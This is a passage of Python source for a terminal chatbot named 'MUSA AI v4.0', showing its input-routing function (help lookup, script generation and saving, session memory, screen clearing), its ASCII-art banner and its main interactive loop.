    # Tool-specific help
    if text_lower.endswith(" help"):
        tool = text_lower.replace(" help", "").strip()
        if tool in KNOWLEDGE_BASE:
            print_answer(f"{tool.upper()} - COMPLETE GUIDE", KNOWLEDGE_BASE[tool])
            return True

    # Generate scripts
    if any(p in text_lower for p in ["generate script", "create script", "write script",
                                      "generate python", "create python"]):
        # Extract task
        for pattern in ["generate script for", "create script for", "write script for",
                       "generate python script for", "create python script for"]:
            if pattern in text_lower:
                task = text_lower.replace(pattern, "").strip()
                break
        else:
            task = input(f"\n{Colors.OKCYAN}What should the script do? {Colors.ENDC}").strip()

        script = generate_advanced_script(task)
        cprint(f"\n✅ SCRIPT GENERATED BY MUSA AI v4.0", Colors.OKGREEN, bold=True)
        cprint("─" * 60, Colors.GRAY)
        print(f"{Colors.WHITE}{script}{Colors.ENDC}")
        cprint("─" * 60, Colors.GRAY)

        save = input(f"\n{Colors.OKCYAN}Save to file? (y/n): {Colors.ENDC}").strip().lower()
        if save == 'y':
            filename = f"musa_script_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(script)
            cprint(f"✅ Saved to: {filename}", Colors.OKGREEN)
        return True

    # Memory
    if text_lower in ["memory", "history"]:
        print_section("SESSION MEMORY")
        if SESSION_MEMORY:
            for i, item in enumerate(SESSION_MEMORY[-10:], 1):
                print(f"  {i:2}. {item}")
        else:
            print("  No history yet.")
        return True

    # Clear screen
    if text_lower in ["clear", "cls"]:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        return True

    # Direct knowledge base lookup
    for key in KNOWLEDGE_BASE:
        if key in text_lower or text_lower in key:
            print_answer(key.upper(), KNOWLEDGE_BASE[key])
            return True

    # Kali commands check
    for cmd in KALI_COMMANDS:
        if cmd in text_lower and "help" in text_lower:
            if cmd in KNOWLEDGE_BASE:
                print_answer(f"{cmd.upper()} GUIDE", KNOWLEDGE_BASE[cmd])
                return True

    # Get intelligent response
    response = get_intelligent_response(user_input)

    # Check if it's long (use print instead of speak for long answers)
    if len(response) > 300:
        print_answer("MUSA AI ANSWER", response)
    else:
        speak(response)

    return True

# ====================== HEADER ======================
def print_header():
    os.system("clear" if os.name != "nt" else "cls")
    now = datetime.now()
    print(f"""
{Colors.OKCYAN}{'═' * 65}
{Colors.BOLD}{Colors.OKGREEN}
   ███╗   ███╗██╗   ██╗███████╗ █████╗      █████╗ ██╗
   ████╗ ████║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║
   ██╔████╔██║██║   ██║███████╗███████║    ███████║██║
   ██║╚██╔╝██║██║   ██║╚════██║██╔══██║    ██╔══██║██║
   ██║ ╚═╝ ██║╚██████╔╝███████║██║  ██║    ██║  ██║██║
   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
{Colors.ENDC}{Colors.OKCYAN}
   ✦ Professional AI Assistant v4.0 - Ultimate Edition ✦
   ✦ Date: {now.strftime('%A, %B %d, %Y')}  Time: {now.strftime('%I:%M %p')} ✦
{'═' * 65}{Colors.ENDC}
""")

# ====================== MAIN ======================
def main():
    print_header()

    welcome_msgs = [
        f"Assalam o Alaikum {USER_NAME}! I am MUSA AI v4.0 — Your Ultimate Personal Assistant.",
        "I can answer questions about ANYTHING — History, Science, Countries, Tech, Hacking, and more!",
        "Type 'help' to see all commands. Ask me anything in natural language!",
    ]

    for msg in welcome_msgs:
        speak(msg)
        time.sleep(0.3)

    print(f"\n{Colors.GRAY}  Quick topics: history | pakistan | science | kali linux | python | bitcoin | solar system{Colors.ENDC}\n")

    while True:
        try:
            print(f"{Colors.GRAY}{'─' * 65}{Colors.ENDC}")
            user_input = input(f"{Colors.OKBLUE}👤 {USER_NAME}:{Colors.ENDC} ").strip()

            if not user_input:
                continue

            if not process_input(user_input):
                break

        except KeyboardInterrupt:
            print(f"\n")
            speak("Session interrupted. Goodbye Boss! Take care! 🌟")
            break
        except Exception as e:
            cprint(f"\n[System]: Minor error occurred. Continuing...", Colors.WARNING)
            continue

if __name__ == "__main__":
    main()